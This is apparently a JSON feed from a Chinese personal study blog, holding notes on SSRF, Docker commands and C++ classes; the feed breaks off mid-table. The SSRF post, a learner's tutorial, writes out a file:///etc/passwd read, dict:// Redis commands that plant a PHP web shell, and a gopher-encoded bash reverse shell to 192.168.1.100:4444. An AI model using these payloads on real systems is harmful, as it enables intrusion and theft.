{
    "version": "https://jsonfeed.org/version/1",
    "title": "这就是--Potato",
    "subtitle": "真的假的？",
    "icon": "https://zhewanyiershinicheng.github.io/assets/favicon.ico",
    "description": "bug依旧很多，反正我忍不了",
    "home_page_url": "https://zhewanyiershinicheng.github.io",
    "items": [
        {
            "id": "https://zhewanyiershinicheng.github.io/2025/04/13/%E6%8C%82%E4%B8%80%E4%B8%AA/",
            "url": "https://zhewanyiershinicheng.github.io/2025/04/13/%E6%8C%82%E4%B8%80%E4%B8%AA/",
            "title": "挂一个",
            "date_published": "2025-04-13T09:25:36.000Z",
            "content_html": "<p><img loading=\"lazy\" data-src=\"1744536183520.jpg\" alt=\"1744536183520\" /></p>\n<p><img loading=\"lazy\" data-src=\"1744536183516.jpg\" alt=\"1744536183516\" /></p>\n<p><img loading=\"lazy\" data-src=\"1744536183512.jpg\" alt=\"1744536183512\" /></p>\n",
            "tags": [
                "沃趣"
            ]
        },
        {
            "id": "https://zhewanyiershinicheng.github.io/2025/04/06/SSRF/",
            "url": "https://zhewanyiershinicheng.github.io/2025/04/06/SSRF/",
            "title": "SSRF",
            "date_published": "2025-04-06T15:02:54.000Z",
            "content_html": "<p><img loading=\"lazy\" data-src=\"1743952653208.png\" alt=\"1743952653208\" /></p>\n<p>可以从 URL 关键字中寻找漏洞</p>\n<blockquote>\n<p>share   通常表示分享功能<br />\n wap   表示这是针对移动设备优化的版本<br />\n url   通常用于重定向<br />\n link   获取某个东西<br />\n src   就是 src<br />\nsource   指定数据来源<br />\n target   用于指定表单提交后用于处理的文件<br />\n u\turl 的简写<br />\n display\t控制图片显示方式<br />\n sourceURL\t待下载文件的地址<br />\n imageURL\t指定页面显示的图片的地址<br />\n domain\t后跟域名</p>\n</blockquote>\n<p>产生漏洞的函数 PHP<br />\n<strong>file_get_contents()</strong></p>\n<p>-- 支持 php://input 协议</p>\n<p><strong>sockopen()/fsockopen()</strong></p>\n<p>-- 这个函数用于获取指定的 url 的数据，文件或者 html。使用 socket 建立 tcp 链接。</p>\n<p><strong>curl_exec()</strong></p>\n<p>-- 通过 PHP 获取文件 / 数据，下载到 curled 文件夹，附加随机数和 txt 扩展名</p>\n<p>-- 默认不跟踪跳转，用于执行指定的 url 对话</p>\n<p>伪协议</p>\n<blockquote>\n<p>file:/// 从文件系统中获取文件内容，如，file:///etc/passwd<br />\ndict:// 字典服务器协议，访问字典资源，如，dict:///ip:6739/info：<br />\nsftp:// SSH 文件传输协议或安全文件传输协议<br />\n ldap:// 轻量级目录访问协议，或者 ldaps://,Idapi://<br />\ntftp:// 简单文件传输协议<br />\n gopher:// 分布式文档传递服务，可使用 gopherus 生成 payload</p>\n</blockquote>\n<p><strong>fopen()</strong><br />\n<strong>readfile()</strong></p>\n<p>利用的协议：</p>\n<p>要求目标服务器可以接收用户指定的 URL 并发起请求</p>\n<pre><code>（1）file：在有回显的情况下，利用 file 协议可以读取服务器本地的任意内容\n例如：\n将file:///etc/passwd作为参数提交给该接口，服务器就会尝试读取 /etc/passwd 文件的内容，并将结果返回给攻击者（如果存在回显）\n\n（2）dict：泄露安装软件版本信息，查看端口，操作内网redis服务等\n语法是：\ndict://&lt;server&gt;:&lt;port&gt;/&lt;database identifier&gt;/&lt;search query&gt;\n一些服务响应dict请求会返回自身信息，所以泄露。也可以用于探测端口是否开放 (只构造到dict://&lt;target_ip&gt;:&lt;port&gt;/)。通常只是为已知漏洞做准备。\n但是似乎不能代替file读取普通文件\n\n（3）gopher：gopher支持发出GET、POST请求,可用于反弹shell\n语法是：\ngopher://&lt;host&gt;:&lt;port&gt;/&lt;selector，也就是执行的操作，格式有很多种&gt;\n\n\n（4）http/s：探测内网主机存活，也可以用于探测端口是否开放\n例如：\n构造 http://192.168.1.100:80 这样的 URL 提交给 SSRF 接口，观察服务器的响应来判断 192.168.1.100 的 80 端口是否开放以及是否有 Web 服务在运行。\n</code></pre>\n<p>更进一步的：</p>\n<p>一:dict</p>\n<p>Redis 是一个常用的内存数据库，dict 可以模拟 Redisd 协议格式，通过向内网中的 Redis 服务器发送请求，如果该服务器没有访问控制等，可以执行一些 Redis 命令</p>\n<p>一个流程</p>\n<p>1. 构造  <code>dict://&lt;内网 Redis IP&gt;:6379/INFO</code></p>\n<p>返回版本等信息</p>\n<p>2. 构造 <code>dict://192.168.1.100:6379/CONFIG%20SET%20dir%20/var/www/html</code></p>\n<p>修改数据存储目录</p>\n<p>3. 构造 <code>dict://192.168.1.100:6379/SET%20shell.php%20%22%3C?php%20system(%24_GET%5B%27cmd%27%5D);?%3E%22 </code></p>\n<p>使用 SET 写入 &lt;?php system ($_GET ['cmd']);?&gt;</p>\n<p>4. 构造 <code>dict://192.168.1.100:6379/SAVE</code> , 持久化数据</p>\n<p>5. 访问  <code>http://目标网站域名/shell.php?cmd=ls</code> ，</p>\n<p>使用刚刚的脚本</p>\n<p>这个流程也适用于  <code>gopher</code>  协议请求</p>\n<p>但是使用 Redis 命令要前加一个_，最后要以 %0D%0A 结尾</p>\n<p>例如保存那个要改为：gopher://&lt;Redis 服务器 IP&gt;:6379/_SAVE%0D%0A</p>\n<p>二:gopher</p>\n<p><code>gopher</code>  协议反弹 shell：</p>\n<p>这是利用已经存在的命令执行漏洞，可以是 web 或者 PHP 上的。</p>\n<p>作用是将命令执行的结果返回到你监听的端口处。</p>\n<p>例如命令执行漏洞如果在 <code>vulnerable.php</code> ：</p>\n<p>先构造一个正常的 POST 请求</p>\n<pre><code>POST /vulnerable.php HTTP/1.1\nHost: &lt;目标主机&gt;\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 68\n\ncmd=&lt;?php system(&quot;bash -i &gt;&amp; /dev/tcp/192.168.1.100/4444 0&gt;&amp;1&quot;);?&gt;\n</code></pre>\n<p>然后转化为  <code>gopher</code>  协议格式</p>\n<blockquote>\n<p>将上述 HTTP 请求转换为  <code>gopher</code>  协议的 `` 部分，需要注意以下几点：</p>\n<ul>\n<li>每个换行符（ <code>\\n</code> ）在  <code>gopher</code>  协议中通常用  <code>%0D%0A</code>  表示（ <code>\\r\\n</code>  的 URL 编码）。</li>\n<li>空格用  <code>%20</code>  表示。</li>\n<li>特殊字符需要进行 URL 编码。</li>\n</ul>\n</blockquote>\n<figure class=\"highlight http\"><figcaption data-lang=\"HTTP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>#这也是在构造复杂请求，你也可以截获请求，然后篡改，或者模拟正常用户。</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>转化后：</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">gopher</span><span class=\"token punctuation\">:</span><span class=\"token header-value\">//&lt;目标主机>:80/_POST%20/vulnerable.php%20HTTP/1.1%0D%0AHost:%20&lt;目标主机>%0D%0AContent-Type:%20application/x-www-form-urlencoded%0D%0AContent-Length:%2068%0D%0A%0D%0Acmd%3D%3C%3Fphp%20system(%22bash%20-i%20%3E%26%20/dev/tcp/192.168.1.100/4444%200%3E%261%22);%3F%3E</span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>//其实就是进行两次url编码，但是第一次后要手动将%0A改成%0D%0A</pre></td></tr></table></figure><p>然后监听下 4444 端口：</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">nc</span> <span class=\"token parameter variable\">-lvp</span> <span class=\"token number\">4444</span>     //这什么玩意儿？？？</pre></td></tr></table></figure><p>这样反向连接成功后，就可以在目标主机上执行命名（起码比一直构造好 php 好了很多）</p>\n<p><code>gopher</code>  协议攻击内网服务：</p>\n",
            "tags": [
                "技术"
            ]
        },
        {
            "id": "https://zhewanyiershinicheng.github.io/2025/03/28/docker/",
            "url": "https://zhewanyiershinicheng.github.io/2025/03/28/docker/",
            "title": "docker",
            "date_published": "2025-03-28T12:39:27.000Z",
            "content_html": "<h2 id=\"命令\"><a class=\"anchor\" href=\"#命令\">#</a> 命令</h2>\n<p><img loading=\"lazy\" data-src=\"1743167361020.png\" alt=\"1743167361020\" /></p>\n<p><img loading=\"lazy\" data-src=\"1743167321438.png\" alt=\"1743167321438\" /></p>\n<hr />\n<ul>\n<li><strong> <code>-d</code> </strong>：后台运行容器，例如  <code>docker run -d ubuntu</code> 。</li>\n<li><strong> <code>-it</code> </strong>：以交互式终端运行容器，例如  <code>docker exec -it container_name bash</code> 。</li>\n<li><strong> <code>-t</code> </strong>：为镜像指定标签，例如  <code>docker build -t my-image .</code> 。</li>\n</ul>\n<hr />\n<p><img loading=\"lazy\" data-src=\"1743165757475.png\" alt=\"1743165757475\" /></p>\n<h2 id=\"架构\"><a class=\"anchor\" href=\"#架构\">#</a> 架构</h2>\n<h3 id=\"client\"><a class=\"anchor\" href=\"#client\">#</a> Client</h3>\n<p>常用命令：<br />\n <code>run</code>  (运行容器), <code>ps</code>  (正在运行的容器), <code>bulid</code>  (构建镜像)</p>\n<p><code>exec</code>  (在容器中执行命令)</p>\n<h3 id=\"daemon\"><a class=\"anchor\" href=\"#daemon\">#</a> <strong>Daemon</strong></h3>\n<p>Docker 守护进程（通常是  <code>dockerd</code> ） 监听来自 Docker 客户端的请求，并且通过 Docker API 执行这些请求。</p>\n<p>负责容器、镜像等 Docker 对象的管理，并根据请求的参数启动容器、删除容器、修改容器配置等。</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">sudo</span> systemctl start <span class=\"token function\">docker</span> //启动，但是通常自启动</pre></td></tr></table></figure><h3 id=\"engine-api\"><a class=\"anchor\" href=\"#engine-api\">#</a> <strong>Engine API</strong></h3>\n<p>RESTful 接口，允许外部客户端与 Docker 守护进程进行通信。通过这个 API，用户可以执行各种操作</p>\n<p>可以通过  <code>curl</code>  或其他 HTTP 客户端访问 Docker 引擎 API</p>\n<h3 id=\"containers\"><a class=\"anchor\" href=\"#containers\">#</a> <strong>Containers</strong></h3>\n<p>执行环境 ，容器是从 Docker 镜像启动的，包含了运行某个应用程序所需的一切 —— 从操作系统库到应用程序代码。容器在运行时与其他容器和宿主机共享操作系统内核，但容器之间的文件系统和进程是隔离的 ，它是<strong>镜像运行的一个实例</strong></p>\n<h3 id=\"images\"><a class=\"anchor\" href=\"#images\">#</a> <strong>Images</strong></h3>\n<p>容器的静态只读模板</p>\n<h3 id=\"registries\"><a class=\"anchor\" href=\"#registries\">#</a> <strong>Registries</strong></h3>\n<p>仓库用于存储镜像，最常用的公共仓库是 <strong>Docker Hub</strong>。可以从 Docker Hub 下载镜像，也可以上传自己的镜像分享给其他人。可以部署自己的私有仓库 。</p>\n<h3 id=\"compose\"><a class=\"anchor\" href=\"#compose\">#</a> <strong>Compose</strong></h3>\n<p>用于定义和运行多容器 Docker 应用的工具</p>\n<h3 id=\"swarm\"><a class=\"anchor\" href=\"#swarm\">#</a> <strong>Swarm</strong></h3>\n<p>集群管理和调度工具 ，允许将多个 Docker 主机（节点）组织成一个集群</p>\n<h3 id=\"networks\"><a class=\"anchor\" href=\"#networks\">#</a> <strong>Networks</strong></h3>\n<p>允许容器之间相互通信，并与外部世界进行连接</p>\n<h3 id=\"volumes\"><a class=\"anchor\" href=\"#volumes\">#</a> <strong>Volumes</strong></h3>\n<p>一种数据持久化机制，允许数据在容器之间共享，并且独立于容器的生命周期</p>\n<h2 id=\"使用\"><a class=\"anchor\" href=\"#使用\">#</a> 使用</h2>\n<p>交互式启动</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">docker</span> run <span class=\"token parameter variable\">-i</span> <span class=\"token parameter variable\">-t</span> ubuntu:15.10 /bin/bash</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>-t: 在新容器内指定一个伪终端或终端。</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>-i: 允许你对容器内的标准输入 <span class=\"token punctuation\">(</span>STDIN<span class=\"token punctuation\">)</span> 进行交互。</pre></td></tr></table></figure><p>会进入到容器的命令行中，退出命令行会回到当前主机</p>\n<p>后台启动</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>runoob@runoob:~$ <span class=\"token function\">docker</span> run <span class=\"token parameter variable\">-d</span> ubuntu:15.10 /bin/sh <span class=\"token parameter variable\">-c</span> <span class=\"token string\">\"while true; do echo hello world; sleep 1; done\"</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>//返回容器id，使用<span class=\"token variable\"><span class=\"token variable\">`</span><span class=\"token function\">ps</span><span class=\"token variable\">`</span></span>来查看是否在运行</pre></td></tr></table></figure><p>ps 返回的状态可能是：</p>\n<p><img loading=\"lazy\" data-src=\"1743166915057.png\" alt=\"1743166915057\" /></p>\n<p>返回中的 PORTS 是端口信息和使用的连接类型（tcp\\udp）</p>\n<p>使用 <strong>docker logs</strong> 命令，查看容器内的标准输出（ID 或名称都可以，以下都是这样）。</p>\n<p>使用 <strong>docker stop</strong> 命令来停止容器</p>\n<p>使用 <strong>docker attach</strong>  命令进入后台运行的容器，如果之后退出，会导致停止</p>\n<p>使用 <strong>docker exec -it</strong> 命令进入，则退出不会停止</p>\n<p>导入 / 出容器</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">docker</span> <span class=\"token builtin class-name\">export</span> 1e560fca3906 <span class=\"token operator\">></span> ubuntu.tar  //导出快照</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">cat</span> docker/ubuntu.tar <span class=\"token operator\">|</span> <span class=\"token function\">docker</span> <span class=\"token function\">import</span> - test/ubuntu:v1 //导入快照</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">docker</span> <span class=\"token function\">import</span> http://example.com/exampleimage.tgz example/imagerepo</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>//从url中导入</pre></td></tr></table></figure><p>删除容器</p>\n<p>用   <code>rm -f</code></p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">docker</span> container prune  //删除所以终止状态的容器</pre></td></tr></table></figure><h2 id=\"web\"><a class=\"anchor\" href=\"#web\">#</a> WEB</h2>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">docker</span> pull training/webapp  <span class=\"token comment\"># 从公共镜像载入</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">#training/webapp：它代表了要拉取的镜像的名称。training 是镜像的命名空间或者组织名，webapp 则是镜像的具体名称</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">#docker images 查看已有镜像</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token function\">docker</span> run <span class=\"token parameter variable\">-d</span> <span class=\"token parameter variable\">-P</span> training/webapp python app.py</pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">#-P：将容器内部暴露的端口随机映射到宿主机的一个端口上，外部可以通过宿主机上映射的端口来访问容器内的应用（使用 `ps` 查看映射端口，也可以用 `port`)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>//固定端口使用-p xxxx:yyyy 从容器的yyyy映射到宿主机的xxxx</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>//python app.py：这是在容器内部要执行的命令，它会启动容器内的 Python 应用程序 app.py</pre></td></tr></table></figure><p>使用<strong> docker top</strong> 查看容器进程（类似于 tasklist）</p>\n<p>使用 <strong>docker inspect</strong> 来查看 Docker 的底层信息 （返回 json 文件）</p>\n<p>使用<strong> docker start</strong> 来启动已经停止的容器</p>\n<p>使用 <strong>docker restart</strong> 命令来重启正在运行的容器</p>\n<p>使用 <strong>docker rm</strong> 命令来删除不需要的容器（该容器必须先停止）</p>\n<p><strong>docker ps -l</strong> 查询最后一次创建的容器</p>\n",
            "tags": [
                "技术"
            ]
        },
        {
            "id": "https://zhewanyiershinicheng.github.io/2025/03/22/%E4%B8%80%E7%82%B9C-%E7%9A%84%E7%A2%8E%E7%A2%8E%E5%BF%B5/",
            "url": "https://zhewanyiershinicheng.github.io/2025/03/22/%E4%B8%80%E7%82%B9C-%E7%9A%84%E7%A2%8E%E7%A2%8E%E5%BF%B5/",
            "title": "一点C-的碎碎念",
            "date_published": "2025-03-22T10:36:29.000Z",
            "content_html": "<h2 id=\"一点疑惑\"><a class=\"anchor\" href=\"#一点疑惑\">#</a> 一点疑惑</h2>\n<h3 id=\"1this指针选b\"><a class=\"anchor\" href=\"#1this指针选b\">#</a> 1.this 指针 (选 B)</h3>\n<p><img loading=\"lazy\" data-src=\"1742639945490.png\" alt=\"1742639945490\" /></p>\n<p>A. 构造函数用于初始化对象，在构造函数中可以使用 <code>this</code>  指针来区分成员变量和局部变量，或者通过 <code>this</code>  指针调用其他成员函数等。例如：</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">MyClass</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">public</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">int</span> num<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token function\">MyClass</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> num<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token keyword\">this</span><span class=\"token operator\">-></span>num <span class=\"token operator\">=</span> num<span class=\"token punctuation\">;</span>  <span class=\"token comment\">// 用于区分时必须明写 this</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>B. 此时 <code>this</code>  指针是一个指向常量对象的指针，即 <code>const</code>  类型的指针，不能指向可以被修改的对象</p>\n<pre><code class=\"language-c++\">class MyClass &#123;\npublic:\n    int num;\n    void printNum() const &#123;\n        // this 指针指向常量对象\n        const MyClass* constThis = this;\n        // 可以使用 this 指针访问成员变量，但不能修改\n        std::cout &lt;&lt; this-&gt;num &lt;&lt; std::endl;\n    &#125;\n&#125;;\n/*在实际使用中，const类型的成员函数依然可以使用this来指向调用它的对象，也可以访问其内容*/\n</code></pre>\n<p>C，D 都是正确的</p>\n<h3 id=\"2构造析构函数的执行\"><a class=\"anchor\" href=\"#2构造析构函数的执行\">#</a> 2. 构造 / 析构函数的执行</h3>\n<p>不放题目就说一下：</p>\n<p>构造函数</p>\n<p>默认就有普通构造函数和复制构造函数（是浅拷贝，仅仅赋值），它们是重载的</p>\n<p>但是，如果自己写了任意一种的构造函数，就不会在默认生成</p>\n<p>可以使用</p>\n<pre><code class=\"language-c++\">MyClass() = default\n</code></pre>\n<p>来显式指定生成默认的构造函数</p>\n<p>另外，const 可以作为构造函数的重载区分，当定义的对象是 const 类型，它才会被自动调用。</p>\n<p>析构函数</p>\n<p>没有参数，不可重载，都是先入后出（同生存期时，包括对象数组），这是因为后面定义的对象析构时可能访问已销毁的前面的对象，所以这是 C++ 的标准要求的，跟怎么存储没有关系。还有就是，如果堆上的对象不是手动释放，在程序结束后<strong>不会调用析构函数</strong>，而是被操作系统直接回收。</p>\n<h3 id=\"3成员函数conststatic\"><a class=\"anchor\" href=\"#3成员函数conststatic\">#</a> 3. 成员函数 &amp; const&amp;static</h3>\n<p>常成员函数：</p>\n<p>属于对象本身，不能通过  <code>this</code>  指针修改调用对象的非常数据成员 ，但是可以使用外部的数据 / 函数</p>\n<p><strong>并且可以修改外部数据（除 const 的数据），被调用外部函数也可以修改对象的非常数据成员</strong></p>\n<p>稍微复杂一点：</p>\n<pre><code class=\"language-c++\">#include &lt;iostream&gt;\nclass AnotherClass &#123;\npublic:\n    void nonConstFunction() &#123;\n        std::cout &lt;&lt; &quot;Non-const function of AnotherClass.&quot; &lt;&lt; std::endl;\n    &#125;\n    void constFunction() const &#123;\n        std::cout &lt;&lt; &quot;Const function of AnotherClass.&quot; &lt;&lt; std::endl;\n    &#125;\n&#125;;\nclass MyClass &#123;\npublic:\n    void constFunction(const AnotherClass&amp; anotherObj, AnotherClass&amp; nonConstAnotherObj) const &#123;\n        // 可以调用 const 对象的 const 成员函数\n        anotherObj.constFunction();\n        // 以下代码会报错，不能调用 const 对象的非 const 成员函数\n        // anotherObj.nonConstFunction(); \n        // 可以调用非 const 对象的非 const 成员函数\n        nonConstAnotherObj.nonConstFunction();\n    &#125;\n&#125;;\nint main() &#123;\n    AnotherClass obj1;\n    const AnotherClass obj2;\n    MyClass myObj;\n    myObj.constFunction(obj2, obj1);\n    return 0;\n&#125;\n//其实也不复杂，就是说如果用了其他对象，那么能否调用其中的函数，看那个对象本身是否可以调用\n//但是话又说回来，如果那个对象的方法改变了本来这个对象的非const成员函数，依然是会报错的\n//同理，被调用的对象不能调用调用对象的非const成员函数\n总之就是：不能改变/使用本身对象里的非const成员（除被声明为mutable的成员数据），其他随意。\n</code></pre>\n<p>静态成员函数：</p>\n<p>属于类，也可以通过对象调用，但是没有区别，只能使用静态成员数据 / 函数和外部数据 / 函数</p>\n<p>提一下：</p>\n<p>1. 静态成员数据不是在构造函数中初始化的（但是构造函数可以使用它），必须在类外以 <code>类名::变量名=xxx</code>  的形式初始化，不过，如果它同时是 const 的话，<strong>甚至可以直接在类内就定义</strong>（也可以不）</p>\n<p>2. 常数据成员只能在构造函数的初始化列表中定义（除了上面那个情况），不能在函数本身或者外部</p>\n<p>3.<strong>const 对象只能绑定到 const 引用</strong>，但是，const 引用可以绑定非 const 对象</p>\n<p>所以成员函数应该：</p>\n<pre><code class=\"language-c++\">bool operator&gt;(const Complex &amp;other) const&#123;&#125;\n//关注前一个const的作用\n</code></pre>\n<p>否则传入 const 对象时会报错。</p>\n<p>总之就是：static 类型的属于类本身，但是 const 属于对象，只有同时是 static 和 const 才能类内定义</p>\n<h3 id=\"4重载\"><a class=\"anchor\" href=\"#4重载\">#</a> 4. 重载</h3>\n<p>并不是每个可重载的运算符都能以这三种方式重载。例如，赋值运算符  <code>=</code> 、下标运算符  <code>[]</code> 、函数调用运算符  <code>()</code>  和成员访问运算符  <code>-&gt;</code>  只能重载为成员函数。</p>\n<p>对于 ++ 运算符的重载，可以只重载一种形式（后置有个 int 作为占位参数）</p>\n<h3 id=\"5对象与引用\"><a class=\"anchor\" href=\"#5对象与引用\">#</a> 5. 对象与引用</h3>\n<p>引用是对象的别名，你<strong>可以将对象本身当作引用传入或者传出</strong>。</p>\n<p>也就是说：</p>\n<pre><code class=\"language-c++\">CLASS fuction (CLASS&amp; F)&#123;...&#125;\ncLASS function (CLASS F)&#123;...&#125;\n都可以用；\nCLASS a,b;\nb=function(a);\n来调用，不需要用CLASS &amp;c=a;b=function(c);这样的表达。\n只是前者会达到类似指针的效果，后者单纯传值（这里俩不能重载）\n同理：\nCLASS function(...)&#123;...&#125;\nCLASS &amp;fuction(...)&#123;...&#125;\n都可以用：\nreturn *this;\n来返回\n前者返回的是副本，需要存在复制构造函数，如果后续是连续操作，会在副本上操作\n造成不能连续使用，而前者返回还是原对象的应用，尽管看着还是返回对象（这也就是为什么重载输入输出流时必须是返回引用）\n</code></pre>\n<h2 id=\"各种库\"><a class=\"anchor\" href=\"#各种库\">#</a> 各种库</h2>\n<h3 id=\"iostream-iomanip\"><a class=\"anchor\" href=\"#iostream-iomanip\">#</a> &lt;iostream&gt;&amp; &lt;iomanip&gt;</h3>\n<p>主要类</p>\n<ul>\n<li><code>std::istream</code> ：用于输入操作的抽象基类。</li>\n<li><code>std::ostream</code> ：用于输出操作的抽象基类。</li>\n<li><code>std::iostream</code> ：继承自 <code>std::istream</code>  和 <code>std::ostream</code> ，用于同时进行输入和输出操作。</li>\n<li><code>std::cin</code> ：标准输入流对象，通常与键盘关联。</li>\n<li><code>std::cout</code> ：标准输出流对象，通常与屏幕关联。</li>\n<li><code>std::cerr</code> ：标准错误输出流对象，不带缓冲，通常与屏幕关联。</li>\n<li><code>std::clog</code> ：标准日志流对象，带缓冲，通常与屏幕关联</li>\n</ul>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:left\"><strong>函数 / 操纵符</strong></th>\n<th style=\"text-align:left\"><strong>功能</strong></th>\n<th style=\"text-align:left\"><strong>实例代码</strong></th>\n<th style=\"text-align:left\"><strong>输出结果</strong></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:left\"><code>std::setw(int n)</code></td>\n<td style=\"text-align:left\">设置字段宽度，为<strong>下一次</strong>输出指定宽度</td>\n<td style=\"text-align:left\"><code>std::cout &lt;&lt; std::setw(5) &lt;&lt; 42;</code></td>\n<td style=\"text-align:left\"><code>42</code></td>\n</tr>\n<tr>\n<td style=\"text-align:left\"><code>std::setfill(char)</code></td>\n<td style=\"text-align:left\">设置填充字符（默认是空格）</td>\n<td style=\"text-align:left\"><code>std::cout &lt;&lt; std::setfill('*') &lt;&lt; std::setw(5) &lt;&lt; 42;</code></td>\n<td style=\"text-align:left\"><code>***42</code></td>\n</tr>\n<tr>\n<td style=\"text-align:left\"><code>std::left</code></td>\n<td style=\"text-align:left\">设置左对齐</td>\n<td style=\"text-align:left\"><code>std::cout &lt;&lt; std::left &lt;&lt; std::setw(5) &lt;&lt; 42;</code></td>\n<td style=\"text-align:left\"><code>42</code></td>\n</tr>\n<tr>\n<td style=\"text-align:left\"><code>std::right</code></td>\n<td style=\"text-align:left\">设置右对齐</td>\n<td style=\"text-align:left\"><code>std::cout &lt;&lt; std::right &lt;&lt; std::setw(5) &lt;&lt; 42;</code></td>\n<td style=\"text-align:left\"><code>42</code></td>\n</tr>\n<tr>\n<td style=\"text-align:left\"><code>std::internal</code></td>\n<td style=\"text-align:left\">符号靠左，其余靠右</td>\n<td style=\"text-align:left\"><code>std::cout &lt;&lt; std::internal &lt;&lt; std::setw(5) &lt;&lt; -42;</code></td>\n<td style=\"text-align:left\"><code>- 42</code></td>\n</tr>\n<tr>\n<td style=\"text-align:left\"><code>std::setprecision(int)</code></td>\n<td style=\"text-align:left\">设置浮点数的有效位数</td>\n<td style=\"text-align:left\"><code>std::cout &lt;&lt; std::setprecision(3) &lt;&lt; 3.14159;</code></td>\n<td style=\"text-align:left\"><code>3.14</code></td>\n</tr>\n<tr>\n<td style=\"text-align:left\"><code>std::fixed</code></td>\n<td style=\"text-align:left\">设置定点格式输出浮点数</td>\n<td style=\"text-align:left\"><code>std::cout &lt;&lt; std::fixed &lt;&lt; std::setprecision(2) &lt;&lt; 3.14159;</code></td>\n<td style=\"text-align:left\"><code>3.14</code></td>\n</tr>\n<tr>\n<td style=\"text-align:left\"><code>std::scientific</code></td>\n<td style=\"text-align:left\">设置科学计数法格式输出浮点数</td>\n<td style=\"text-align:left\"><code>std::cout &lt;&lt; std::scientific &lt;&lt; 3.14159;</code></td>\n<td style=\"text-align:left\"><code>3.141590e+00</code></td>\n</tr>\n<tr>\n<td style=\"text-align:left\"><code>std::hex</code></td>\n<td style=\"text-align:left\">设置整数以 16 进制显示</td>\n<td style=\"text-align:left\"><code>std::cout &lt;&lt; std::hex &lt;&lt; 42;</code></td>\n<td style=\"text-align:left\"><code>2a</code></td>\n</tr>\n<tr>\n<td style=\"text-align:left\"><code>std::oct</code></td>\n<td style=\"text-align:left\">设置整数以 8 进制显示</td>\n<td style=\"text-align:left\"><code>std::cout &lt;&lt; std::oct &lt;&lt; 42;</code></td>\n<td style=\"text-align:left\"><code>52</code></td>\n</tr>\n<tr>\n<td style=\"text-align:left\"><code>std::dec</code></td>\n<td style=\"text-align:left\">设置整数以 10 进制显示（默认）</td>\n<td style=\"text-align:left\"><code>std::cout &lt;&lt; std::dec &lt;&lt; 42;</code></td>\n<td style=\"text-align:left\"><code>42</code></td>\n</tr>\n<tr>\n<td style=\"text-align:left\"><code>std::showbase</code></td>\n<td style=\"text-align:left\">显示进制前缀（如  <code>0x</code>  表示 16 进制）</td>\n<td style=\"text-align:left\"><code>std::cout &lt;&lt; std::showbase &lt;&lt; std::hex &lt;&lt; 42;</code></td>\n<td style=\"text-align:left\"><code>0x2a</code></td>\n</tr>\n<tr>\n<td style=\"text-align:left\"><code>std::noshowbase</code></td>\n<td style=\"text-align:left\">隐藏进制前缀（默认）</td>\n<td style=\"text-align:left\"><code>std::cout &lt;&lt; std::noshowbase &lt;&lt; std::hex &lt;&lt; 42;</code></td>\n<td style=\"text-align:left\"><code>2a</code></td>\n</tr>\n<tr>\n<td style=\"text-align:left\"><code>std::uppercase</code></td>\n<td style=\"text-align:left\">16 进制字母显示为大写</td>\n<td style=\"text-align:left\"><code>std::cout &lt;&lt; std::uppercase &lt;&lt; std::hex &lt;&lt; 42;</code></td>\n<td style=\"text-align:left\"><code>2A</code></td>\n</tr>\n<tr>\n<td style=\"text-align:left\"><code>std::nouppercase</code></td>\n<td style=\"text-align:left\">16 进制字母显示为小写（默认）</td>\n<td style=\"text-align:left\"><code>std::cout &lt;&lt; std::nouppercase &lt;&lt; std::hex &lt;&lt; 42;</code></td>\n<td style=\"text-align:left\"><code>2a</code></td>\n</tr>\n<tr>\n<td style=\"text-align:left\"><code>std::showpos</code></td>\n<td style=\"text-align:left\">在正数前显示  <code>+</code>  